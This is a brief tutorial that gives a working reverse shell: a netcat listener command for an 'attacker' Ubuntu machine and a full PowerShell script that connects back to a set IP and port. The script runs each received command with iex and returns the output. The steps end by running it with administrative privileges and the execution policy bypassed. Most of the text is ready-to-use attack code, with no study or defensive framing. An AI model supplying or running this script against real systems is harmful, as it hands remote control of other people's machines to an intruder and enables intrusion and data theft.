On the Attacker Machine (Ubuntu)
Start a Netcat Listener:
This will listen for incoming connections from the target machine.


nc -lvnp 4444
Replace 4444 with the port number you wish to use for the reverse shell.
On the Target Machine (PowerShell)
Create and Execute the PowerShell Reverse Shell Script:
This script will connect back to the attacker's machine and provide a reverse shell.

$client = New-Object System.Net.Sockets.TCPClient("192.168.1.193", 4444); 
$stream = $client.GetStream(); 
[byte[]]$bytes = 0..65535|%{0}; 
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
    $sendback = (iex $data 2>&1 | Out-String ); 
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "; 
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
    $stream.Write($sendbyte, 0, $sendbyte.Length); 
    $stream.Flush() 
}
$client.Close()
Replace "192.168.1.193" with the IP address of your Ubuntu machine and 4444 with the port number you specified.

Execution Steps
Copy the PowerShell Script: Copy the above PowerShell script into a .ps1 file, for example, reverse-shell.ps1.

Run the PowerShell Script on the Target Machine: Execute the script on the target machine. Open PowerShell with administrative privileges and run:

powershell -ExecutionPolicy Bypass -File .\reverse-shell.ps1
Receive the Connection: Your Netcat listener on the Ubuntu machine should now receive a connection from the target machine, providing you with a reverse shell.
